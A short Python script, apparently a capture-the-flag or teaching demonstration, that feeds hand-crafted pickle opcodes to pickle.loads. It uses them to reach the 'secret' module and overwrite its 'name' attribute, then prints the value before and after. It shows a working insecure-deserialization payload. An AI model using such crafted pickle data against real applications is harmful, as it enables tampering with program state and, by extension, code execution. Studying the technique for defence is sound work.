import pickle
import secret

opcode = '''c__main__
secret
(S'name'
S'1'
db.'''

print('before:', secret.name)

output = pickle.loads(opcode.encode())

print('output:', output)
print('after:', secret.name)
